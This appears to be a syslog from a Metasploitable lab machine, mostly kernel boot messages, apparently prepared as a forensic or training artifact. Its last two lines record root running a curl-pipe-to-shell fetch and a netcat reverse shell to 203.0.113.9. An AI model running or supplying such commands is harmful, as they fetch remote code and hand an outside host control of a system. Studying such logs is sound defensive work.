+Sep 13 17:20:26 metasploitable kernel: [   17.365529] USB Universal Host Controller Interface driver v3.0
+Sep 13 17:20:26 metasploitable kernel: [   17.672567] ioc0: LSI53C1030 B0: Capabilities={Initiator}
+Sep 13 17:20:26 metasploitable kernel: [   17.998122] Floppy drive(s): fd0 is 1.44M
+Sep 13 17:20:26 metasploitable kernel: [   18.123019] FDC 0 is a post-1991 82077
+Sep 13 17:20:26 metasploitable kernel: [   18.525492] scsi0 : ioc0: LSI53C1030 B0, FwRev=01032920h, Ports=1, MaxQ=128, IRQ=16
+Sep 13 17:20:26 metasploitable kernel: [   19.222738] ACPI: PCI Interrupt 0000:02:01.0[A] -> GSI 19 (level, low) -> IRQ 17
+Sep 13 17:20:26 metasploitable kernel: [   19.222781] scsi 0:0:0:0: Direct-Access     VMware,  VMware Virtual S 1.0  PQ: 0 ANSI: 2
+Sep 13 17:20:26 metasploitable kernel: [   19.222805]  target0:0:0: Beginning Domain Validation
+Sep 13 17:20:26 metasploitable kernel: [   19.223308] pcnet32: PCnet/PCI II 79C970A at 0x2000, 00 0c 29 0f a7 4f assigned IRQ 17.
+Sep 13 17:20:26 metasploitable kernel: [   19.225171] eth0: registered as PCnet/PCI II 79C970A
+Sep 13 17:20:26 metasploitable kernel: [   19.225444]  target0:0:0: Domain Validation skipping write tests
+Sep 13 17:20:26 metasploitable kernel: [   19.225461]  target0:0:0: Ending Domain Validation
+Sep 13 17:20:26 metasploitable kernel: [   19.225542]  target0:0:0: FAST-40 WIDE SCSI 80.0 MB/s ST (25 ns, offset 127)
+Sep 13 17:20:26 metasploitable kernel: [   19.226097] ACPI: PCI Interrupt 0000:02:02.0[A] -> GSI 16 (level, low) -> IRQ 18
+Sep 13 17:20:26 metasploitable kernel: [   19.226429] pcnet32: PCnet/PCI II 79C970A at 0x2080, 00 0c 29 0f a7 59 assigned IRQ 18.
+Sep 13 17:20:26 metasploitable kernel: [   19.226896] eth1: registered as PCnet/PCI II 79C970A
+Sep 13 17:20:26 metasploitable kernel: [   19.227109] pcnet32: 2 cards_found.
+Sep 13 17:20:26 metasploitable kernel: [   19.227329] ACPI: PCI Interrupt 0000:02:00.0[A] -> GSI 18 (level, low) -> IRQ 19
+Sep 13 17:20:26 metasploitable kernel: [   19.227432] uhci_hcd 0000:02:00.0: UHCI Host Controller
+Sep 13 17:20:26 metasploitable kernel: [   19.227690] uhci_hcd 0000:02:00.0: new USB bus registered, assigned bus number 1
+Sep 13 17:20:26 metasploitable kernel: [   19.228091] uhci_hcd 0000:02:00.0: irq 19, io base 0x00002400
+Sep 13 17:20:26 metasploitable kernel: [   19.228617] usb usb1: configuration #1 chosen from 1 choice
+Sep 13 17:20:26 metasploitable kernel: [   19.228683] hub 1-0:1.0: USB hub found
+Sep 13 17:20:26 metasploitable kernel: [   19.228715] hub 1-0:1.0: 2 ports detected
+Sep 13 17:20:26 metasploitable kernel: [   19.376336] ACPI: PCI Interrupt 0000:02:03.0[A] -> GSI 17 (level, low) -> IRQ 16
+Sep 13 17:20:26 metasploitable kernel: [   19.376508] ehci_hcd 0000:02:03.0: EHCI Host Controller
+Sep 13 17:20:26 metasploitable kernel: [   19.376573] ehci_hcd 0000:02:03.0: new USB bus registered, assigned bus number 2
+Sep 13 17:20:26 metasploitable kernel: [   19.377374] ehci_hcd 0000:02:03.0: irq 16, io mem 0xef5ff000
+Sep 13 17:20:26 metasploitable kernel: [   19.414065] scsi1 : ata_piix
+Sep 13 17:20:26 metasploitable kernel: [   19.414606] scsi2 : ata_piix
+Sep 13 17:20:26 metasploitable kernel: [   19.414686] ata1: PATA max UDMA/33 cmd 0x1f0 ctl 0x3f6 bmdma 0x1060 irq 14
+Sep 13 17:20:26 metasploitable kernel: [   19.414702] ata2: PATA max UDMA/33 cmd 0x170 ctl 0x376 bmdma 0x1068 irq 15
+Sep 13 17:20:26 metasploitable kernel: [   19.422248] ehci_hcd 0000:02:03.0: USB 2.0 started, EHCI 1.00, driver 10 Dec 2004
+Sep 13 17:20:26 metasploitable kernel: [   19.422425] usb usb2: configuration #1 chosen from 1 choice
+Sep 13 17:20:26 metasploitable kernel: [   19.422474] hub 2-0:1.0: USB hub found
+Sep 13 17:20:26 metasploitable kernel: [   19.422503] hub 2-0:1.0: 6 ports detected
+Sep 13 17:20:26 metasploitable kernel: [   20.122661] Driver 'sd' needs updating - please use bus_type methods
+Sep 13 17:20:26 metasploitable kernel: [   20.123597] sd 0:0:0:0: [sda] 16777216 512-byte hardware sectors (8590 MB)
+Sep 13 17:20:26 metasploitable kernel: [   20.123961] sd 0:0:0:0: [sda] Write Protect is off
+Sep 13 17:20:26 metasploitable kernel: [   20.124469] sd 0:0:0:0: [sda] Cache data unavailable
+Sep 13 17:20:26 metasploitable kernel: [   20.127281] sd 0:0:0:0: [sda] 16777216 512-byte hardware sectors (8590 MB)
+Sep 13 17:20:26 metasploitable kernel: [   20.127543] sd 0:0:0:0: [sda] Write Protect is off
+Sep 13 17:20:26 metasploitable kernel: [   20.127943] sd 0:0:0:0: [sda] Cache data unavailable
+Sep 13 17:20:26 metasploitable kernel: [   20.129624]  sda: sda1 sda2 < sda5 >
+Sep 13 17:20:26 metasploitable kernel: [   20.165042] sd 0:0:0:0: [sda] Attached SCSI disk
+Sep 13 17:20:26 metasploitable kernel: [   20.170765] ata2.00: ATAPI: VMware Virtual IDE CDROM Drive, 00000001, max UDMA/33
+Sep 13 17:20:26 metasploitable kernel: [   20.172501] sd 0:0:0:0: Attached scsi generic sg0 type 0
+Sep 13 17:20:26 metasploitable kernel: [   20.323795] ata2.00: configured for UDMA/33
+Sep 13 17:20:26 metasploitable kernel: [   20.325152] scsi 2:0:0:0: CD-ROM            NECVMWar VMware IDE CDR10 1.00 PQ: 0 ANSI: 5
+Sep 13 17:20:26 metasploitable kernel: [   20.325303] scsi 2:0:0:0: Attached scsi generic sg1 type 5
+Sep 13 17:20:26 metasploitable kernel: [   20.378651] Driver 'sr' needs updating - please use bus_type methods
+Sep 13 17:20:26 metasploitable kernel: [   20.425611] sr0: scsi3-mmc drive: 1x/1x writer dvd-ram cd/rw xa/form2 cdda tray
+Sep 13 17:20:26 metasploitable kernel: [   20.425629] Uniform CD-ROM driver Revision: 3.20
+Sep 13 17:20:26 metasploitable kernel: [   21.070484] Attempting manual resume
+Sep 13 17:20:26 metasploitable kernel: [   21.124074] EXT3-fs: INFO: recovery required on readonly filesystem.
+Sep 13 17:20:26 metasploitable kernel: [   21.124095] EXT3-fs: write access will be enabled during recovery.
+Sep 13 17:20:26 metasploitable kernel: [   21.473070] kjournald starting.  Commit interval 5 seconds
+Sep 13 17:20:26 metasploitable kernel: [   21.473174] EXT3-fs: dm-0: orphan cleanup on readonly fs
+Sep 13 17:20:26 metasploitable kernel: [   21.473420] EXT3-fs: dm-0: 6 orphan inodes deleted
+Sep 13 17:20:26 metasploitable kernel: [   21.473432] EXT3-fs: recovery complete.
+Sep 13 17:20:26 metasploitable kernel: [   21.477489] EXT3-fs: mounted filesystem with ordered data mode.
+Sep 13 17:20:26 metasploitable kernel: [   24.362273] Linux agpgart interface v0.102
+Sep 13 17:20:26 metasploitable kernel: [   24.463535] agpgart: Detected an Intel 440BX Chipset.
+Sep 13 17:20:26 metasploitable kernel: [   24.512648] agpgart: AGP aperture is 256M @ 0x0
+Sep 13 17:20:26 metasploitable kernel: [   24.614180] pci_hotplug: PCI Hot Plug PCI Core version: 0.5
+Sep 13 17:20:26 metasploitable kernel: [   24.714293] shpchp: Standard Hot Plug PCI Controller Driver version: 0.4
+Sep 13 17:20:26 metasploitable kernel: [   24.810468] input: Power Button (FF) as /devices/virtual/input/input2
+Sep 13 17:20:26 metasploitable kernel: [   24.952601] ACPI: Power Button (FF) [PWRF]
+Sep 13 17:20:26 metasploitable kernel: [   24.952956] piix4_smbus 0000:00:07.3: Found 0000:00:07.3 device
+Sep 13 17:20:26 metasploitable kernel: [   25.061837] ACPI: AC Adapter [ACAD] (on-line)
+Sep 13 17:20:26 metasploitable kernel: [   26.566814] eth0: link up
+Sep 13 17:20:26 metasploitable kernel: [   28.915091] input: PC Speaker as /devices/platform/pcspkr/input/input3
+Sep 13 17:20:26 metasploitable kernel: [   29.419222] input: ImPS/2 Generic Wheel Mouse as /devices/platform/i8042/serio1/input/input4
+Sep 13 17:20:26 metasploitable kernel: [   31.415602] parport_pc 00:08: reported by Plug and Play ACPI
+Sep 13 17:20:26 metasploitable kernel: [   31.416008] parport0: PC-style at 0x378, irq 7 [PCSPP,TRISTATE]
+Sep 13 17:20:26 metasploitable kernel: [   32.365965] NET: Registered protocol family 17
+Sep 13 17:20:26 metasploitable kernel: [   33.405563] loop: module loaded
+Sep 13 17:20:26 metasploitable kernel: [   33.418711] lp0: using parport0 (interrupt-driven).
+Sep 13 17:20:26 metasploitable kernel: [   34.017418] EXT3 FS on dm-0, internal journal
+Sep 13 17:20:26 metasploitable kernel: [   34.671027] kjournald starting.  Commit interval 5 seconds
+Sep 13 17:20:26 metasploitable kernel: [   34.704792] EXT3 FS on sda1, internal journal
+Sep 13 17:20:26 metasploitable kernel: [   34.704807] EXT3-fs: mounted filesystem with ordered data mode.
+Sep 13 17:20:26 metasploitable kernel: [   35.756289] ip_tables: (C) 2000-2006 Netfilter Core Team
+Sep 13 17:20:26 metasploitable kernel: [   38.366714] RPC: Registered udp transport module.
+Sep 13 17:20:26 metasploitable kernel: [   38.366716] RPC: Registered tcp transport module.
+Sep 13 17:20:26 metasploitable kernel: [   38.410137] NET: Registered protocol family 10
+Sep 13 17:20:26 metasploitable kernel: [   38.410270] lo: Disabled Privacy Extensions
+Sep 13 17:20:33 metasploitable kernel: [   46.264583] Installing knfsd (copyright (C) 1996 okir@monad.swb.de).
+Sep 13 17:20:33 metasploitable kernel: [   46.319905] NFSD: Using /var/lib/nfs/v4recovery as the NFSv4 state recovery directory
+Sep 13 17:20:33 metasploitable kernel: [   46.320646] NFSD: starting 90-second grace period
+Sep 13 17:27:43 metasploitable bash: root[5553]: curl -s http://203.0.113.9/beacon | /bin/sh
+Sep 13 17:27:46 metasploitable bash: root[5553]: nc -e /bin/sh 203.0.113.9 4444
